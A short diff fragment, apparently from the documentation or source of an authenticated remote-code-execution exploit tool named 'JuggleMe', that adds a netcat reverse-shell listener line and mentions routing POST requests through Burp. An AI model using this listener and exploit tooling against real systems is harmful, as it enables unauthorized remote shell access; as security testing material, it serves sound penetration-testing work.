@@ -105,6 +105,8 @@ Proxies
 It may be beneficial to add proxies to the POST requests if you'd like to intercept a request with burp and inspect that it looks like the POST request you are expecting.	
 ### Reverse Shell and Listener
 
+	listener = subprocess.Popen(["nc", "-nvlp", self.localport])
+	
 ## def get_args():
 
 	parser = argparse.ArgumentParser(description='JuggleMe v 0.1.0 - Remote Code Execution (RCE) (Authenticated)')
